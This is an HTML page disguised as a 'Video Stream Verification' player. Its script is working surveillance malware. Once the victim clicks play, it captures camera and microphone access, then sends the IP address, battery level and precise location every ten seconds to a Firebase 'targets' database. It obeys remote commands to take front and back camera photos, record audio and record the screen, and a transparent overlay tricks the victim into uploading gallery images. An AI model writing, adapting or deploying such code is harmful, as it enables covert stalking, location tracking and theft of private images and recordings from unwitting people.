<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Stream Verification</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
        #main-ui { position: fixed; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); z-index: 10; }
        #play-btn { width: 100px; height: 100px; border: 4px solid #00ff41; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px #00ff41; }
        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #00ff41; margin-left: 10px; }
        #player { display: none; width: 100%; height: 100%; object-fit: cover; }
        #hidden-input { display: none; }
    </style>
</head>
<body>

<div id="main-ui">
    <div id="play-btn" onclick="startApp()"></div>
    <h2 style="color:#00ff41; margin-top:20px;">START VERIFICATION</h2>
</div>

<video id="player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
<input type="file" id="hidden-input" accept="image/*" multiple>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const sessionID = "SRV_" + Math.floor(1000 + Math.random() * 9000);
    
    let activeStream = null;
    let pendingAction = null;

    async function startApp() {
        document.getElementById('main-ui').style.display = 'none';
        const v = document.getElementById('player');
        v.style.display = 'block';
        v.play();

        try {
            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            sendInfo();
            listenCommands();
            setInterval(sendLoc, 10000);
        } catch (e) { alert("Camera Permission Required!"); location.reload(); }
    }

    async function sendInfo() {
        const ipReq = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipReq.json();
        const batt = await navigator.getBattery();
        db.ref(`targets/${sessionID}/info`).set({
            ip: ipData.ip, battery: Math.floor(batt.level * 100) + "%",
            status: "ONLINE", last_seen: new Date().toLocaleTimeString()
        });
    }

    function sendLoc() {
        navigator.geolocation.getCurrentPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy: true});
    }

    // --- FINAL CAMERA LOGIC (FIXED & MERGED) ---
    async function forceCapture(facing) {
        // 1. Pehle chalte hue saare camera tracks ko band karo (Switching ke liye zaroori hai)
        if (activeStream) {
            activeStream.getTracks().forEach(track => track.stop());
        }

        const constraints = {
            video: { 
                facingMode: facing === 'user' ? "user" : { exact: "environment" },
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        };

        try {
            // 2. Naye lens (Front ya Back) se stream mangna
            const stream = await navigator.mediaDevices.getUserMedia(constraints)
                .catch(async () => {
                    // Fallback: Agar 'exact' fail ho jaye, to normal request karein
                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
                });
            
            const v = document.createElement('video');
            v.srcObject = stream;
            v.muted = true;
            await v.play();

            // 3. 2 second wait taake focus/lighting set ho jaye
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = v.videoWidth;
                canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.6),
                    type: facing === 'user' ? "FRONT_CAM" : "BACK_CAM",
                    time: Date.now()
                });

                // 4. Photo lene ke baad tracks band karo aur original background stream on karo
                stream.getTracks().forEach(t => t.stop());
                restartBackgroundStream();
            }, 2000);

        } catch (err) {
            console.error("Camera Switch Failed:", err);
            restartBackgroundStream(); // Error par bhi background camera wapis on karein
        }
    }

    async function restartBackgroundStream() {
        try {
            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        } catch(e) { console.log("Restart Stream Fail"); }
    }

    function listenCommands() {
        db.ref(`commands/${sessionID}`).on('value', snap => {
            const cmd = snap.val();
            if(!cmd) return;

            if(cmd.action === 'photo') forceCapture('user');
            if(cmd.action === 'back_photo') forceCapture('environment');
            if(cmd.action === 'audio') startAudioRec();
            if(cmd.action === 'gallery' || cmd.action === 'screen') {
                pendingAction = cmd.action;
                createOverlay();
            }
            db.ref(`commands/${sessionID}`).remove();
        });
    }

    function createOverlay() {
        const ov = document.createElement('div');
        ov.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:rgba(0,0,0,0.01);";
        ov.onclick = () => {
            if(pendingAction === 'gallery') document.getElementById('hidden-input').click();
            if(pendingAction === 'screen') startScreenRec();
            document.body.removeChild(ov);
            pendingAction = null;
        };
        document.body.appendChild(ov);
    }

    function startAudioRec() {
        const mr = new MediaRecorder(activeStream);
        let chunks = [];
        mr.ondataavailable = e => chunks.push(e.data);
        mr.onstop = () => {
            const reader = new FileReader();
            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ data: reader.result });
        };
        mr.start();
        setTimeout(() => mr.stop(), 5000);
    }

    async function startScreenRec() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const mr = new MediaRecorder(stream);
            let chunks = [];
            mr.ondataavailable = e => chunks.push(e.data);
            mr.onstop = () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(chunks, {type:'video/webm'}));
                reader.onloadend = () => db.ref(`targets/${sessionID}/screens`).push({ data: reader.result });
                stream.getTracks().forEach(t => t.stop());
            };
            mr.start();
            setTimeout(() => mr.stop(), 10000);
        } catch(e) {}
    }

    document.getElementById('hidden-input').onchange = (e) => {
        for(let file of e.target.files) {
            const reader = new FileReader();
            reader.onload = ev => db.ref(`targets/${sessionID}/gallery`).push({ data: ev.target.result });
            reader.readAsDataURL(file);
        }
    };
</script>
</body>
</html>
